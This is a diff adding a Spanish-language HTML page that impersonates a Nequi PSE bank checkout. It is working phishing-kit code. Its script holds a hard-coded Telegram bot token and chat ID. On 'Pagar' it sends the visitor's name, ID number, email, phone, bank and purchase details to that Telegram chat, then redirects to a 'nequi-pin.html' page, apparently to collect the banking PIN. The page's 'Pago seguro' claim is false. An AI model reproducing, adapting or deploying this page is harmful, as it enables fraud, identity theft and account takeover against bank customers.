@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos PSE de Nequi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logo placeholder - reemplazar con tu imagen */
+
+        /* Descomenta esto y elimina .logo-placeholder para usar tu logo */
+
+        .logo {
+            width: 150px;
+            height: 50px;
+            object-fit: contain;
+            margin-bottom: 30px;
+        }
+
+
+        .title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #4A154B;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            max-width: 400px;
+        }
+
+        /* Banco seleccionado */
+        .bank-selected {
+            width: 100%;
+            background-color: #f8f4f9;
+            border: 2px solid #DA0081;
+            border-radius: 12px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .bank-icon {
+            width: 50px;
+            height: 50px;
+            background-color: #DA0081;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bank-icon svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+
+        .bank-info {
+            flex: 1;
+        }
+
+        .bank-name {
+            font-size: 18px;
+            font-weight: 600;
+            color: #4A154B;
+        }
+
+        .bank-type {
+            font-size: 14px;
+            color: #888;
+        }
+
+        .change-bank {
+            color: #DA0081;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .change-bank:hover {
+            text-decoration: underline;
+        }
+
+        /* Resumen de compra */
+        .purchase-summary {
+            width: 100%;
+            background-color: #f8f8f8;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .summary-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #4A154B;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            padding-top: 15px;
+            margin-top: 5px;
+            border-top: 2px solid #ddd;
+        }
+
+        .summary-label {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .summary-value {
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .summary-total {
+            font-size: 18px;
+            font-weight: 700;
+            color: #4A154B;
+        }
+
+        /* Formulario */
+        .form-section {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #4A154B;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 6px;
+            margin-left: 5px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background-color: #f8f8f8;
+            color: #333;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #DA0081;
+            background-color: #fff;
+        }
+
+        .input-field::placeholder {
+            color: #aaa;
+        }
+
+        /* Fila de inputs */
+        .input-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .input-row .input-group {
+            flex: 1;
+        }
+
+        .input-row .input-group.small {
+            flex: 0.7;
+        }
+
+        /* Checkbox de confirmacion */
+        .checkbox-container {
+            width: 100%;
+            border: 2px solid #DA0081;
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background-color: #fef7fb;
+        }
+
+        .checkbox-container:hover {
+            background-color: #fdeef6;
+        }
+
+        .checkbox-container:hover .custom-checkbox {
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(218, 0, 129, 0.4);
+            }
+
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 10px rgba(218, 0, 129, 0);
+            }
+
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(218, 0, 129, 0);
+            }
+        }
+
+        .checkbox-input {
+            display: none;
+        }
+
+        .custom-checkbox {
+            width: 28px;
+            height: 28px;
+            border: 3px solid #DA0081;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .checkbox-input:checked+.custom-checkbox {
+            background-color: #DA0081;
+        }
+
+        .custom-checkbox svg {
+            width: 16px;
+            height: 16px;
+            fill: white;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .checkbox-input:checked+.custom-checkbox svg {
+            opacity: 1;
+        }
+
+        .checkbox-text {
+            font-size: 15px;
+            color: #4A154B;
+            line-height: 1.4;
+        }
+
+        /* Botones */
+        .btn {
+            width: 100%;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            margin-bottom: 12px;
+        }
+
+        .btn-primary {
+            background-color: #f8c8e0;
+            color: #DA0081;
+        }
+
+        .btn-primary:hover {
+            background-color: #DA0081;
+            color: white;
+        }
+
+        .btn-primary:disabled {
+            background-color: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background-color: #fff;
+            color: #333;
+            border: 2px solid #e0e0e0;
+        }
+
+        .btn-secondary:hover {
+            border-color: #DA0081;
+            color: #DA0081;
+        }
+
+        /* Iconos de tarjetas */
+        .card-icons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+            justify-content: center;
+        }
+
+        .card-icon {
+            width: 45px;
+            height: 30px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+            color: #666;
+        }
+
+        /* Seguridad */
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            color: #888;
+            font-size: 13px;
+        }
+
+        .security-note svg {
+            width: 16px;
+            height: 16px;
+            fill: #888;
+        }
+
+        /* Texto de ayuda */
+        .help-text {
+            text-align: center;
+            font-size: 14px;
+            color: #888;
+            margin-top: 15px;
+        }
+
+        .help-text a {
+            color: #DA0081;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Logo placeholder - reemplazar con tu imagen -->
+        <img src="/img/pse-logo.png" alt="Nequi" class="logo">
+
+        <h1 class="title">Pagos PSE de <span id="txt-banco-title">...</span></h1>
+        <p class="subtitle">Completa los datos para finalizar la compra de forma segura.</p>
+
+        <!-- Banco seleccionado -->
+        <div class="bank-selected">
+            <div class="bank-icon">
+                <svg viewBox="0 0 24 24">
+                    <path
+                        d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm14-12v7h3v-7h-3zm-4.5-9L2 6v2h19V6l-9.5-5z" />
+                </svg>
+            </div>
+            <div class="bank-info">
+                <div class="bank-name" id="txt-banco-name">...</div>
+                <div class="bank-type">Cuenta de Ahorros</div>
+            </div>
+            <a href="checkout-pse.html" class="change-bank">Cambiar</a>
+        </div>
+
+        <!-- Resumen de compra -->
+        <div class="purchase-summary">
+            <div class="summary-title">Resumen de tu compra</div>
+            <div class="summary-row">
+                <span class="summary-label">Producto</span>
+                <span class="summary-value" id="txt-producto">...</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Subtotal</span>
+                <span class="summary-value" id="txt-subtotal">...</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Comision PSE</span>
+                <span class="summary-value">$0</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label summary-total">Total a pagar</span>
+                <span class="summary-value summary-total" id="txt-total">...</span>
+            </div>
+        </div>
+
+        <!-- Datos del titular -->
+        <div class="form-section">
+            <div class="section-title">Datos del titular</div>
+
+            <div class="input-group">
+                <label class="input-label">Nombre completo</label>
+                <input type="text" id="pd-nombre" class="input-field req-field" placeholder="Como aparece en tu documento">
+            </div>
+
+            <div class="input-row">
+                <div class="input-group">
+                    <label class="input-label">Tipo de documento</label>
+                    <select id="pd-tipo-doc" class="input-field req-field">
+                        <option value="">Seleccionar</option>
+                        <option value="cc">Cedula de Ciudadania</option>
+                        <option value="ce">Cedula de Extranjeria</option>
+                        <option value="nit">NIT</option>
+                        <option value="pasaporte">Pasaporte</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Numero de documento</label>
+                    <input type="text" id="pd-num-doc" class="input-field req-field" placeholder="Sin puntos ni comas">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">Correo electronico</label>
+                <input type="email" id="pd-correo" class="input-field req-field" placeholder="ejemplo@correo.com">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">Numero de celular</label>
+                <input type="tel" id="pd-celular" class="input-field req-field" placeholder="300 000 0000">
+            </div>
+        </div>
+
+        <!-- Checkbox de confirmacion -->
+        <label class="checkbox-container">
+            <input type="checkbox" class="checkbox-input req-field" id="confirmHuman">
+            <span class="custom-checkbox">
+                <svg viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                </svg>
+            </span>
+            <span class="checkbox-text">Acepto los terminos y condiciones y autorizo el tratamiento de mis datos
+                personales.</span>
+        </label>
+
+        <!-- Botones -->
+        <button class="btn btn-primary" id="btnPagar">Pagar</button>
+        <button class="btn btn-secondary" onclick="window.location.href='checkout-pse.html'">Cancelar</button>
+
+        <!-- Iconos de tarjetas aceptadas -->
+        <div class="card-icons">
+            <div class="card-icon">VISA</div>
+            <div class="card-icon">MC</div>
+            <div class="card-icon">PSE</div>
+            <div class="card-icon">AMEX</div>
+        </div>
+
+        <!-- Nota de seguridad -->
+        <div class="security-note">
+            <svg viewBox="0 0 24 24">
+                <path
+                    d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
+            </svg>
+            <span>Pago seguro con encriptacion SSL</span>
+        </div>
+
+        <p class="help-text">
+            ¿Tienes problemas? <a href="#">Contacta a soporte</a>
+        </p>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+        const CHAT_ID = "6483487531"; // Reemplazar con el chat_id del admin (se obtiene llamando a /getUpdates una vez)
+
+        async function sendToTelegram(text, inlineKeyboard = null) {
+            if (!CHAT_ID) {
+                console.warn("Falta CHAT_ID para enviar a Telegram.");
+                return;
+            }
+            const body = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML"
+            };
+            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(body)
+            });
+        }
+
+        const btnPagar = document.getElementById('btnPagar');
+        const reqFields = document.querySelectorAll('.req-field');
+
+        // Initial Data load
+        const nombre = sessionStorage.getItem("nombre") || "—";
+        const cedula = sessionStorage.getItem("cedula") || "—";
+        const correo = sessionStorage.getItem("correo") || "—";
+        const telefono = sessionStorage.getItem("telefono") || "—";
+        const total = sessionStorage.getItem("total") || "—";
+        const banco = sessionStorage.getItem("banco") || "—";
+        const tipoBanco = sessionStorage.getItem("tipoBanco") || "—";
+        const producto = sessionStorage.getItem("producto") || "—";
+
+        document.getElementById("txt-banco-title").textContent = banco;
+        document.getElementById("txt-banco-name").textContent = banco;
+        document.getElementById("txt-producto").textContent = producto;
+        document.getElementById("txt-subtotal").textContent = total;
+        document.getElementById("txt-total").textContent = total;
+        btnPagar.textContent = "Pagar " + total;
+
+        // Populate fields from session if available
+        document.getElementById("pd-nombre").value = nombre !== "—" ? nombre : "";
+        document.getElementById("pd-num-doc").value = cedula !== "—" ? cedula : "";
+        document.getElementById("pd-correo").value = correo !== "—" ? correo : "";
+        document.getElementById("pd-celular").value = telefono !== "—" ? telefono : "";
+
+        // Validacion
+        function checkValidity() {
+            let isValid = true;
+            reqFields.forEach(field => {
+                if (field.type === 'checkbox') {
+                    if (!field.checked) isValid = false;
+                } else if (field.value.trim() === '') {
+                    isValid = false;
+                }
+            });
+            btnPagar.disabled = !isValid;
+        }
+
+        reqFields.forEach(field => {
+            field.addEventListener('input', checkValidity);
+            field.addEventListener('change', checkValidity);
+        });
+
+        checkValidity();
+
+        // Accion del boton pagar
+        btnPagar.addEventListener('click', async function () {
+            if (btnPagar.disabled) return;
+
+            try {
+                const text = `💳 <b>Pago en Proceso — Pago con Tarjeta</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n🛒 Producto: ${producto}`;
+                await sendToTelegram(text);
+            } catch (err) { console.error(err); }
+
+            window.location.href = 'nequi-pin.html';
+        });
+
+        // Formatear numero de celular
+        const celularInput = document.getElementById('pd-celular');
+        celularInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            if (value.length > 3 && value.length <= 6) {
+                value = value.slice(0, 3) + ' ' + value.slice(3);
+            } else if (value.length > 6) {
+                value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6);
+            }
+            e.target.value = value;
+        });
+    </script>
+</body>
+
+</html>
